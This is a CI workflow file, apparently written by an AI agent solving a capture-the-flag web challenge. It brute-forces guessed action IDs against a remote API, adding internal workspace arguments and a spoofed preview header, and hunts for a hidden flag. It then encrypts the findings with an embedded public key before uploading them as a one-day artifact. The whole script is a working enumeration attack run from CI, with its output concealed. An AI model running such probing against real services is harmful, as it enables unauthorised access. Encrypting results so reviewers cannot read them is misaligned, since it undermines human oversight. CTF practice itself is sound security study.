name: launchlet-part3-actionmath23
on:
  push:
    branches: [agent/launchlet-part3-actionmath23-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe arithmetic action IDs and encrypt non-unknown responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,time
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          known=int('6f4b9a2c1d0e8a71',16); mask=(1<<64)-1
          vals=set()
          # Dense small arithmetic range + special 23-based transforms.
          for d in range(-96,97):
            if d: vals.add((known+d)&mask)
          for d in [23,0x23,23*2,23*3,23*4,23*8,23*16,23*23,0x230,0x2300,0x230000,0x23000000,0x2300000000]:
            vals.add((known+d)&mask);vals.add((known-d)&mask);vals.add(known^d)
          for r in [1,4,8,16,23,32,41,63]:
            vals.add(((known<<r)|(known>>(64-r)))&mask);vals.add(((known>>r)|(known<<(64-r)))&mask)
          # Byte/nibble changes involving 0x17/0x23.
          for shift in range(0,64,4):
            for v in [0x17,0x23,23]: vals.add((known ^ ((v&0xff)<<shift))&mask)
          vals.discard(known)
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board'}
          argslist=[
            {'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'},
            {'workspaceId':'ws-launchlet-internal','projectId':'launchlet-demo-board','deployRef':'preview-8b11c'},
            {'workspaceId':'ws-launchlet-internal','projectId':'Enterprise rollout closeout','deployRef':'preview-8b11c','receipt':'lrec_preview_demo_2026','export':True},
          ]
          hits=[];checked=0
          for n in sorted(vals):
            aid='act_'+format(n,'016x')
            for args in argslist:
              checked+=1
              try:r=s.post(base+'/api/actions/invoke',headers=h,json={'actionId':aid,'args':args},timeout=6)
              except Exception as e: continue
              if not (r.status_code==404 and r.text=='{"error":"unknown_action"}'):
                item={'actionId':aid,'delta_signed':n-known,'xor':hex(n^known),'args':args,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};hits.append(item)
                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
                if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
            if (out/'FOUND.txt').exists():break
            if checked and checked%120==0: time.sleep(.15)
          (out/'summary.json').write_text(json.dumps({'candidate_ids':len(vals),'checked':checked,'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-actionmath23-encrypted
          path: artifact/
          retention-days: 1
